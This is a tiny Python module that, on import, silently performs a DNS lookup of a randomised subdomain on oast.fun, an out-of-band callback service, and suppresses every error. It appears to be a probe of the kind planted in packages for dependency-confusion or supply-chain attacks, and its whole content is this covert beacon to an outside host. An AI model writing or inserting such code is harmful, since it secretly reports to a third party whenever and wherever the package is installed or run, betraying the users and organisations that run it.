import socket

def _simple():
    try:

        dn = "atlass-check.autaeqjhfowvnnmkwhxjtq8x39d8nder1.oast.fun"
        
        socket.gethostbyname(dn)
    except:
        pass

_simple()